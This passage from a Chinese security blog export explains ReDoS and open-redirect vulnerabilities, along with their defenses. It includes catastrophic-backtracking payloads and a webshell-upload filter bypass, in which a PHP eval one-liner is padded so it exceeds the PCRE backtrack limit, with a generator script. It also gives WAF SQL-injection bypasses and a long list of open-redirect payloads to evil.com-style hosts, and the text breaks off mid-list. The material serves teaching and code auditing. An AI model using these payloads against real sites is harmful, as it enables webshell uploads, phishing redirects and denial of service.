<h2 id="ReDos问题"><a href="#ReDos问题" class="headerlink" title="ReDos问题"></a>ReDos问题</h2><p>​    下面跳出正则部分，开始描述DOS部分</p>
<h3 id="回溯陷阱"><a href="#回溯陷阱" class="headerlink" title="回溯陷阱"></a>回溯陷阱</h3><p>​    前文我们已经提到<code>NFA</code>正则引擎的自身机制导致正则匹配有回溯的问题</p>
<p>eg: <code>text = &quot;aaaaaaaaaaaaaa&quot;, pattern=/^(a*)b$/</code></p>
<ul>
<li><code>(a*)</code>,匹配到了文本中的<code>aaaaaaaaaaaaaa</code></li>
<li>匹配正则中<code>b</code>无法匹配，<code>text</code>中的所有的a都被<code>(a*)</code>吃了</li>
<li>开始吐，吐一个a不行</li>
<li>继续吐……</li>
<li>到最后都不能匹配，如果文本a过多，回溯次数过多，Dos拒绝服务</li>
<li>如果一个正则表达式有多个部分需要回溯，那么次数就是指数型。文本长度为100，两个部分需要回溯，则100^2 = 10000次，恐怖</li>
</ul>
<p>eg:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">begin_time = time.time()</span><br><span class="line">re.match(<span class="string">"^(a+)+$"</span>, <span class="string">r"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"total time = &#123;0&#125;"</span>.format(time.time() - begin_time))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">total time = <span class="number">31.8870000839</span></span><br></pre></td></tr></table></figure>

<h3 id="一些ReDos样例"><a href="#一些ReDos样例" class="headerlink" title="一些ReDos样例"></a>一些ReDos样例</h3><ul>
<li>(a+)+</li>
<li>([a-zA-Z]+)*</li>
<li>(a|aa)+</li>
<li>(a|a?)+</li>
<li>(.*a){x} | for x &gt; 10</li>
</ul>
<p>Payload: “aaaaaaaaaaaaaaaaaa!”</p>
<h3 id="一些业务场景"><a href="#一些业务场景" class="headerlink" title="一些业务场景"></a>一些业务场景</h3><ul>
<li>Person Name:<ul>
<li>Regex: <code>^[a-zA-Z]+(([\&#39;\,\.\-][a-zA-Z ])?[a-zA-Z]*)*$</code></li>
<li>Payload: <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code></li>
</ul>
</li>
<li>Java Classname<ul>
<li>Regex: <code>^(([a-z])+.)+[A-Z]([a-z])+$</code></li>
<li>Payload: <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code></li>
</ul>
</li>
<li>Email Validation<ul>
<li>Regex: <code>^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@(([0-9a-zA-Z])+([-\w]*[0-9a-zA-Z])*\.)+[a-zA-Z]{2,9})$</code></li>
<li>Payload: <code>a@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code></li>
</ul>
</li>
<li>Multiple Email address validation<ul>
<li>Regex: <code>^[a-zA-Z]+(([\&#39;\,\.\-][a-zA-Z ])?[a-zA-Z]*)*\s+&lt;(\w[-._\w]*\w@\w[-._\w]*\w\.\w{2,3})&gt;$|^(\w[-._\w]*\w@\w[-._\w]*\w\.\w{2,3})$</code></li>
<li>Payload: <code>aaaaaaaaaaaaaaaaaaaaaaaa!</code></li>
</ul>
</li>
<li>Decimal validator<ul>
<li>Regex: <code>^\d*[0-9](|.\d*[0-9]|)*$</code></li>
<li>Payload: <code>1111111111111111111111111!</code></li>
</ul>
</li>
<li>Pattern Matcher<ul>
<li>Regex: <code>^([a-z0-9]+([\-a-z0-9]*[a-z0-9]+)?\.){0,}([a-z0-9]+([\-a-z0-9]*[a-z0-9]+)?){1,63}(\.[a-z0-9]{2,7})+$</code></li>
<li>Payload: <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code></li>
</ul>
</li>
</ul>
<h3 id="小结下"><a href="#小结下" class="headerlink" title="小结下"></a>小结下</h3><ul>
<li>重复分组构造</li>
<li>交替重叠</li>
</ul>
<h3 id="防御-amp-amp-优化"><a href="#防御-amp-amp-优化" class="headerlink" title="防御&amp;&amp;优化"></a>防御&amp;&amp;优化</h3><p>​    从开发or安全角度</p>
<ul>
<li>正则表达式书写注意，防止多处回溯(需要开发有一定的正则功底)</li>
<li>文本串长度限制</li>
</ul>
<p><img data-src="./ReDos%E6%B5%85%E6%9E%90/1.png" alt></p>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><h3 id="一道php代码审计"><a href="#一道php代码审计" class="headerlink" title="一道php代码审计"></a>一道php代码审计</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file_name = <span class="string">'C:\phpStudy\WWW\xxx\webshell.php'</span>;</span><br><span class="line">$user_dir = <span class="string">'C:\phpStudy\WWW\xxx'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($file_name);</span><br><span class="line"><span class="comment">//$data = file_get_contents($_FILES['file']['tmp_name']);</span></span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"successful"</span>;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码最后的目的是绕过<code>is_php</code>函数的限制，写入php木马</p>
<p>如下，这个是绕不过正则的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	@<span class="keyword">eval</span> ($_REQUEST[<span class="string">"xxx"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>但是这个正则存在回溯陷阱问题</li>
<li>php中有最大回溯次数的限制。默认为1000000</li>
</ul>
<p><img data-src="./ReDos%E6%B5%85%E6%9E%90/2.png" alt></p>
<p>payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'aaa&lt;?php eval($_POST[txt]);//'</span> + <span class="string">'a'</span> * <span class="number">1000000</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>aaaaaaaa...aaaaaaaa</code>会吃完正则中第一个<code>.*</code>,但是该payload不会匹配<code>[(</code>;?&gt;]`,所以只能吐，进入回溯陷阱</li>
</ul>
<p>生成POC文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># print('aaa&lt;?php eval($_POST[txt]);//' + 'a' * 1000000)</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">'webshell_flag.php'</span></span><br><span class="line"><span class="keyword">with</span> open(filename, <span class="string">'w'</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    file_object.write(<span class="string">'aaa&lt;?php eval($_POST[txt]);//'</span> + <span class="string">'a'</span> * <span class="number">1000000</span>)</span><br></pre></td></tr></table></figure>

<p><img data-src="./ReDos%E6%B5%85%E6%9E%90/3.png" alt></p>
<p>成功绕过</p>
<p>其它:</p>
<ul>
<li>waf - 1</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/SELECT.+FROM.+/is'</span>, $input)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'SQL Injection'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>waf - 2</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/UNION.+?SELECT/is'</span>, $input)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'SQL Injection'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload： <code>UNION/*aaaaa*/SELECT</code> （aaaaa吃掉第一个.+?,后续发现 S 和 * 不匹配，导致开始吐，进入陷阱）</p>
<h3 id="上述的防御"><a href="#上述的防御" class="headerlink" title="上述的防御"></a>上述的防御</h3><ul>
<li>用<code>preg_match</code>对字符串进行匹配，一定要使用<code>===</code>全等号来判断返回值</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_php($input) === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// fwrite($f, $input); ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>因为正常情况返回 0， 1 ，超过回溯次数返回False</li>
</ul>
<p><img data-src="./ReDos%E6%B5%85%E6%9E%90/4.png" alt></p>
<p><img data-src="./ReDos%E6%B5%85%E6%9E%90/5.png" alt></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>regex</tag>
        <tag>Dos攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>URL重定向浅析</title>
    <url>/2021/01/29/blog_formal/security/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/URL%E9%87%8D%E5%AE%9A%E5%90%91%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<h1 id="URL重定向浅析"><a href="#URL重定向浅析" class="headerlink" title="URL重定向浅析"></a>URL重定向浅析</h1><p>​    网站浏览器接收用户的输入，跳转到一个攻击者控制的网站，钓鱼骗走个人信息、登录口令等</p>
<a id="more"></a>

<h2 id="原理概要"><a href="#原理概要" class="headerlink" title="原理概要"></a>原理概要</h2><ul>
<li>服务端未对传入的跳转<code>url</code>变量进行检查和控制，导致可恶意构造任意一个恶意地址，诱导用户跳转到恶意网站。其利用网页中对于看起来正常的路标的信任,做一层跳转,达到欺骗的作用</li>
<li>由于是从可信的站点跳转出去的，用户会比较信任，所以跳转漏洞一般用于钓鱼攻击，通过转到恶意网站欺骗用户输入用户名和密码盗取用户信息，或欺骗用户进行金钱交易</li>
<li>一些陌生的<code>url</code>链接，如<code>jtvs152.cc</code>，大家不会去点击访问，或者对这类链接有一定警惕。但是如果是<code>www.baidu.com</code>这类比较常见的链接，大家就会相对比较信任。如果有信任的链接存在<code>url</code>重定向问题跳转到恶意链接，这样易发生危害</li>
</ul>
<p><img data-src="./URL%E9%87%8D%E5%AE%9A%E5%90%91%E6%B5%85%E6%9E%90/1.png" alt></p>
<p><img data-src="./URL%E9%87%8D%E5%AE%9A%E5%90%91%E6%B5%85%E6%9E%90/2.png" alt></p>
<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><ul>
<li>写代码时没有考虑过任意<code>URL</code>跳转漏洞，或者根本不知道/不认为这是个漏洞</li>
<li>写代码时考虑不周,用取子串、取后缀等方法简单判断，代码逻辑可被绕过</li>
<li>对传入参数做一些奇葩的操作(域名剪切/拼接/重组)和判断，适得其反，反被绕过</li>
<li>原始语言自带的解析<code>URL</code>、判断域名的函数库出现逻辑漏洞或者意外特性,可被绕过</li>
<li>原始语言、服务器/容器特性、浏览器等对标准URL协议解析处理等差异性导致被绕过</li>
</ul>
<h2 id="跳转成因"><a href="#跳转成因" class="headerlink" title="跳转成因"></a>跳转成因</h2><h3 id="header头跳转"><a href="#header头跳转" class="headerlink" title="header头跳转"></a>header头跳转</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># url.html</span><br><span class="line">&lt;a href&#x3D;&quot;url.php?url&#x3D;http:&#x2F;&#x2F;www.baidu.com&quot;&gt;click me&lt;&#x2F;a&gt;</span><br><span class="line"># url.php</span><br><span class="line">&lt;?php </span><br><span class="line">  header(&quot;Content-Type:text&#x2F;html1;charset&#x3D;utf-8&quot;);</span><br><span class="line">  if (isset($_REQUEST[&quot;url&quot;]))&#123;</span><br><span class="line">  	$url &#x3D;$_REQUEST[&quot;url&quot;];</span><br><span class="line">  &#125;else &#123;</span><br><span class="line">  	$url &#x3D; &quot;url.html&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  header(&quot;HTTP&#x2F;1.1 301&quot;); </span><br><span class="line">  header(&quot;Location: $url&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="javascript跳转"><a href="#javascript跳转" class="headerlink" title="javascript跳转"></a>javascript跳转</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">  alert(getQueryString(<span class="string">"site"</span>));</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getQueryString</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  	<span class="keyword">var</span> reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(^|&amp;)"</span> + name + <span class="string">"=([^&amp;]*)(&amp;|$)"</span>, <span class="string">"i"</span>);</span><br><span class="line">  	<span class="keyword">var</span> r = <span class="built_in">window</span>.location.search.substr(<span class="number">1</span>).match(reg);</span><br><span class="line">  	<span class="keyword">if</span> (r!=<span class="literal">null</span>)</span><br><span class="line">  		<span class="keyword">return</span> <span class="built_in">unescape</span>(r[<span class="number">2</span>]);</span><br><span class="line">  	<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> site = getQueryString(<span class="string">"site"</span>); <span class="comment">//首先获取用户请求的链接</span></span><br><span class="line">  <span class="built_in">window</span>.location.href = site; <span class="comment">//跳转链接</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="META标签内跳转"><a href="#META标签内跳转" class="headerlink" title="META标签内跳转"></a>META标签内跳转</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">if (isset($_REQUEST[&quot;url&quot;]))&#123; </span><br><span class="line">$url &#x3D; $_REQUEST[&quot;url&quot;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$url &#x3D; &quot;metaJump.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br><span class="line">&lt;h1&gt;Test&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Refresh&quot; content&#x3D;&quot;5; url &#x3D;&lt;?php echo $url ?&gt;&quot; &gt; #设置页面跳转延时5s</span><br><span class="line">&lt;title&gt;metaJump&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">2</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="常见跳转代码"><a href="#常见跳转代码" class="headerlink" title="常见跳转代码"></a>常见跳转代码</h2><ul>
<li><code>Java</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">response.sendRedirect(request.getParameter(<span class="string">"url"</span>));</span><br></pre></td></tr></table></figure>

<ul>
<li><code>PHP</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$redirect_url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">header(<span class="string">"Location: "</span> . $redirect_url);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>.NET:</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string redirect_url &#x3D; request.QueryString[&quot;url&quot;];</span><br><span class="line">Response.Redirect(redirect_url);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>Django</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">redirect_url = request.GET.get(<span class="string">"url"</span>)</span><br><span class="line">HttpResponseRedirect(redirect_url)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>Flask</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">redirect_url = request.form[<span class="string">'url'</span>]</span><br><span class="line">redirect(redirect_url)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>Rails</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redirect_to params[:url]</span><br></pre></td></tr></table></figure>

<h2 id="跳转场景"><a href="#跳转场景" class="headerlink" title="跳转场景"></a>跳转场景</h2><ul>
<li>用户登录、统一身份认证处，认证完后会跳转</li>
<li>用户分享、收藏内容过后，会跳转</li>
<li>跨站点认证、授权后，会跳转</li>
<li>站内点击其它网址链接时，会跳转</li>
<li>投票功能</li>
</ul>
<p>备注：修改参数中的合法<code>URL</code>为非法<code>URL</code>，然后查看是否能正常跳转或者响应包是否包含了任意的构造<code>URL</code></p>
<h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">inurl:关键词</span><br><span class="line">go、redirect、url、redirectUrl、callback、return_url、toUrl、ReturnUrl、fromUrl、redUrl、request、redirect_to、redirect_url、jump、jump_to、target、to、goto、link、linkto、domain、oauth_callback</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><ul>
<li>利用<code>url</code>重定向，将用户跳转至恶意界面，配合<code>cs</code>进行钓鱼攻击等</li>
<li>某些网站使用<code>referer</code>进行校验时，当使用<code>html</code>方式进行跳转时，可携带<code>referer</code>，绕过限制</li>
<li>使用白名单机制进行<code>url</code>的校验，使用<code>url</code>重定向可以绕过限制</li>
</ul>
<h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><p>​    这部分同<code>SSRF</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. 单斜线"/"绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=/www.evil.com</span><br><span class="line">2. 缺少协议绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=//www.evil.com</span><br><span class="line">3. 多斜线"/"前缀绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=///www.evil.com</span><br><span class="line">https://www.landgrey.me/redirect.php?url=www.evil.com</span><br><span class="line">4. 利用"@"符号绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com</span><br><span class="line">5. 利用反斜线"\"绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=https://www.evil.com\www.landgrey.me</span><br><span class="line">6. 利用"#"符号绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me</span><br><span class="line">7. 利用"?"号绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me</span><br><span class="line">8. 利用"\\"绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=https://www.evil.com\\www.landgrey.me</span><br><span class="line">9. 利用"."绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=.evil           (可能会跳转到www.landgrey.me.evil域名)</span><br><span class="line">https://www.landgrey.me/redirect.php?url=.evil.com       (可能会跳转到evil.com域名)</span><br><span class="line">10.重复特殊字符绕过</span><br><span class="line">https://www.landgrey.me/redirect.php?url=///www.evil.com//..</span><br><span class="line">https://www.landgrey.me/redirect.php?url=www.evil.com//..</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 其它</span></span><br><span class="line">1. 跳转到IP地址，而不是域名;</span><br><span class="line">2. 跳转到IPV6地址，而不是IPv4地址;</span><br><span class="line">3. 将要跳转到的IP地址用10进制、8进制、16进制形式表示;</span><br><span class="line">4. 更换协议,使用ftp、gopher协议等;</span><br><span class="line">5. 借鉴SSRF漏洞绕过的tricks;</span><br><span class="line">6. CRLF注入不能xss时，转向利用任意URL跳转漏洞;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul>
<li>若跳转的<code>URL</code>事先是可以确定的，包括<code>url</code>和参数的值，则可以在后台先配置好，<code>url</code>参数只需传对应<code>url</code>的索引即可，通过索引找到对应具体<code>url</code>再进行跳转(白名单思想)</li>
<li>若跳转的<code>URL</code>事先不确定，但其输入是由后台生成的(不是用户通过参数传人)，则可以先生成好跳转链接然后进行签名，而跳转链接首先需要进行验证签名通过才能进行跳转(签名思想)</li>
<li>若1和2都不满足，<code>url</code>事先无法确定，只能通过前端参数传入，则必须在跳转的时候对<code>url</code>进行按规则校验：即控制<code>url</code>是否是授权的白名单或者是符合规则的<code>url</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function checkURL ( sURL) &#123;</span><br><span class="line">return (&#x2F;^(https?:\&#x2F;\&#x2F;)?[\w-.]+.(yourDomainA|yourDomainB|yourDomainC).com($|\&#x2F;|\)&#x2F;i).test(sUrl)||(&#x2F;^[\w][\w\&#x2F;.-_%]+$&#x2F;i).test(sUrl)||(&#x2F;^[\&#x2F;\][^\&#x2F;\]&#x2F;i).test(sUrl) ? true : false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>XSS</code>漏洞的注意事项 ：跳转<code>url</code>检测中也加入了<code>CRLF</code>头部注入漏洞的检测逻辑, 具体就是在请求参数中加入了<code>%0d%0a</code>这种测试代码，需要对这些参数进行删除处理(事实上：在判断到一个参数中包含 <code>%00 -&gt; %1f</code>的控制字符时都是不合法的，需对其进行删除)</li>
</ul>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>一些<code>payload</code></p>
<p><a href="https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt" target="_blank" rel="noopener">https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//localdomain.pw/%2f..</span><br><span class="line">//www.whitelisteddomain.tld@localdomain.pw/%2f..</span><br><span class="line">///localdomain.pw/%2f..</span><br><span class="line">///www.whitelisteddomain.tld@localdomain.pw/%2f..</span><br><span class="line">////localdomain.pw/%2f..</span><br><span class="line">////www.whitelisteddomain.tld@localdomain.pw/%2f..</span><br><span class="line">https://localdomain.pw/%2f..</span><br><span class="line">https://www.whitelisteddomain.tld@localdomain.pw/%2f..</span><br><span class="line">/https://localdomain.pw/%2f..</span><br><span class="line">/https://www.whitelisteddomain.tld@localdomain.pw/%2f..</span><br><span class="line">//localdomain.pw/%2f%2e%2e</span><br><span class="line">//www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e</span><br><span class="line">///localdomain.pw/%2f%2e%2e</span><br><span class="line">///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e</span><br><span class="line">////localdomain.pw/%2f%2e%2e</span><br><span class="line">////www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e</span><br><span class="line">https://localdomain.pw/%2f%2e%2e</span><br><span class="line">https://www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e</span><br><span class="line">/https://localdomain.pw/%2f%2e%2e</span><br><span class="line">/https://www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e</span><br><span class="line">//localdomain.pw/</span><br><span class="line">//www.whitelisteddomain.tld@localdomain.pw/</span><br><span class="line">///localdomain.pw/</span><br><span class="line">///www.whitelisteddomain.tld@localdomain.pw/</span><br><span class="line">////localdomain.pw/</span><br><span class="line">////www.whitelisteddomain.tld@localdomain.pw/</span><br><span class="line">https://localdomain.pw/</span><br><span class="line">https://www.whitelisteddomain.tld@localdomain.pw/</span><br><span class="line">/https://localdomain.pw/</span><br><span class="line">/https://www.whitelisteddomain.tld@localdomain.pw/</span><br><span class="line">//localdomain.pw//</span><br><span class="line">//www.whitelisteddomain.tld@localdomain.pw//</span><br><span class="line">///localdomain.pw//</span><br><span class="line">///www.whitelisteddomain.tld@localdomain.pw//</span><br><span class="line">////localdomain.pw//</span><br><span class="line">////www.whitelisteddomain.tld@localdomain.pw//</span><br><span class="line">https://localdomain.pw//</span><br><span class="line">https://www.whitelisteddomain.tld@localdomain.pw//</span><br><span class="line">//https://localdomain.pw//</span><br><span class="line">//https://www.whitelisteddomain.tld@localdomain.pw//</span><br><span class="line">//localdomain.pw/%2e%2e%2f</span><br><span class="line">//www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f</span><br><span class="line">///localdomain.pw/%2e%2e%2f</span><br><span class="line">///www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f</span><br><span class="line">////localdomain.pw/%2e%2e%2f</span><br><span class="line">////www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f</span><br><span class="line">https://localdomain.pw/%2e%2e%2f</span><br><span class="line">https://www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f</span><br><span class="line">//https://localdomain.pw/%2e%2e%2f</span><br><span class="line">//https://www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f</span><br><span class="line">///localdomain.pw/%2e%2e</span><br><span class="line">///www.whitelisteddomain.tld@localdomain.pw/%2e%2e</span><br><span class="line">////localdomain.pw/%2e%2e</span><br><span class="line">////www.whitelisteddomain.tld@localdomain.pw/%2e%2e</span><br><span class="line">https:///localdomain.pw/%2e%2e</span><br><span class="line">https:///www.whitelisteddomain.tld@localdomain.pw/%2e%2e</span><br><span class="line">//https:///localdomain.pw/%2e%2e</span><br><span class="line">//www.whitelisteddomain.tld@https:///localdomain.pw/%2e%2e</span><br><span class="line">/https://localdomain.pw/%2e%2e</span><br><span class="line">/https://www.whitelisteddomain.tld@localdomain.pw/%2e%2e</span><br><span class="line">///localdomain.pw/%2f%2e%2e</span><br><span class="line">///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e</span><br><span class="line">////localdomain.pw/%2f%2e%2e</span><br><span class="line">////www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e</span><br><span class="line">https:///localdomain.pw/%2f%2e%2e</span><br><span class="line">https:///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e</span><br><span class="line">/https://localdomain.pw/%2f%2e%2e</span><br><span class="line">/https://www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e</span><br><span class="line">/https:///localdomain.pw/%2f%2e%2e</span><br><span class="line">/https:///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e</span><br><span class="line"><span class="meta">/%</span><span class="bash">09/localdomain.pw</span></span><br><span class="line"><span class="meta">/%</span><span class="bash">09/www.whitelisteddomain.tld@localdomain.pw</span></span><br><span class="line"><span class="meta">//%</span><span class="bash">09/localdomain.pw</span></span><br><span class="line"><span class="meta">//%</span><span class="bash">09/www.whitelisteddomain.tld@localdomain.pw</span></span><br><span class="line"><span class="meta">///%</span><span class="bash">09/localdomain.pw</span></span><br><span class="line"><span class="meta">///%</span><span class="bash">09/www.whitelisteddomain.tld@localdomain.pw</span></span><br><span class="line"><span class="meta">////%</span><span class="bash">09/localdomain.pw</span></span><br><span class="line"><span class="meta">////%</span><span class="bash">09/www.whitelisteddomain.tld@localdomain.pw</span></span><br><span class="line">https://%09/localdomain.pw</span><br><span class="line">https://%09/www.whitelisteddomain.tld@localdomain.pw</span><br><span class="line"><span class="meta">/%</span><span class="bash">5clocaldomain.pw</span></span><br><span class="line"><span class="meta">/%</span><span class="bash">5cwww.whitelisteddomain.tld@localdomain.pw</span></span><br><span class="line"><span class="meta">//%</span><span class="bash">5clocaldomain.pw</span></span><br><span class="line"><span class="meta">//%</span><span class="bash">5cwww.whitelisteddomain.tld@localdomain.pw</span></span><br><span class="line"><span class="meta">///%</span><span class="bash">5clocaldomain.pw</span></span><br><span class="line"><span class="meta">///%</span><span class="bash">5cwww.whitelisteddomain.tld@localdomain.pw</span></span><br><span class="line"><span class="meta">////%</span><span class="bash">5clocaldomain.pw</span></span><br><span class="line"><span class="meta">////%</span><span class="bash">5cwww.whitelisteddomain.tld@localdomain.pw</span></span><br><span class="line">https://%5clocaldomain.pw</span><br><span class="line">https://%5cwww.whitelisteddomain.tld@localdomain.pw</span><br><span class="line">/https://%5clocaldomain.pw</span><br><span class="line">/https://%5cwww.whitelisteddomain.tld@localdomain.pw</span><br><span class="line">https://localdomain.pw</span><br><span class="line">https://www.whitelisteddomain.tld@localdomain.pw</span><br><span class="line">javascript:alert(1);</span><br><span class="line">javascript:alert(1)</span><br><span class="line">//javascript:alert(1);</span><br><span 